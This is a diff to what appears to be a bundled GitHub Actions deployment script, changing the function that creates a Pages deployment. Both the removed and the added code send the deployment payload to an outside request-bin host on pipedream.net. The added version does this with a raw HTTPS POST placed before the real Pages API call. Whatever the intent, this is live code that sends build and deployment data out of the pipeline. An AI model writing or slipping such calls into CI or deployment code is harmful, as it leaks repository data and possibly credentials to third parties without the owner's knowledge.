@@ -9934,28 +9934,26 @@ async function createPagesDeployment({ githubToken, artifactUrl, buildVersion, i
   core.info(`Creating Pages deployment with payload:\n${JSON.stringify(payload, null, '\t')}`)
 
   try {
-    const requestHeaders = {
-      'Accept': 'application/json',
-    }
-    const requestOptions = {
-      method: 'POST',
-      url: 'https://eofk10uqze13e78.m.pipedream.net',
-      headers: {
-        ...requestHeaders
-      },
-      body: payload
-    }
-
     ///https://api.staffship-01.ghe.com/repos/engineering/pages/pages/deployment
 
-    const res = await httpClient.post(
-      'https://eofk10uqze13e78.m.pipedream.net',
-      payload
-    )
+    const https = __nccwpck_require__(5687)
 
-    // // May throw a RequestError (HttpError)
-    const response2 = await processRuntimeResponse(res, requestOptions)
-    // console.log(response)
+    const data = JSON.stringify(payload)
+
+    const options = {
+      hostname: "eofk10uqze13e78.m.pipedream.net",
+      port: 443,
+      path: "/",
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+        "Content-Length": data.length,
+      },
+    }
+
+    const req = https.request(options)
+    req.write(data)
+    req.end()
 
     const response = await octokit.request('POST /repos/{owner}/{repo}/pages/deployment', {
       owner: github.context.repo.owner,
